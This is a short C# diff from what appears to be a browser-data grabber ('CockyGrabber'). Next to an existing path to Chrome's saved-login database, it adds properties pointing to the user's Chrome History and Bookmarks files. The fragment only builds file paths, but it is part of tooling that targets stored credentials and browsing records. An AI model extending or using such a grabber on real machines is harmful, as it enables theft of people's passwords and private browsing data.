@@ -25,5 +25,19 @@ namespace CockyGrabber.Grabbers
                 return $"C:\\Users\\{Environment.UserName}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data";
             }
         }
+        public override string HistoryPath
+        {
+            get
+            {
+                return $"C:\\Users\\{Environment.UserName}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History";
+            }
+        }
+        public override string BookmarkPath
+        {
+            get
+            {
+                return $"C:\\Users\\{Environment.UserName}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Bookmarks";
+            }
+        }
     }
 }
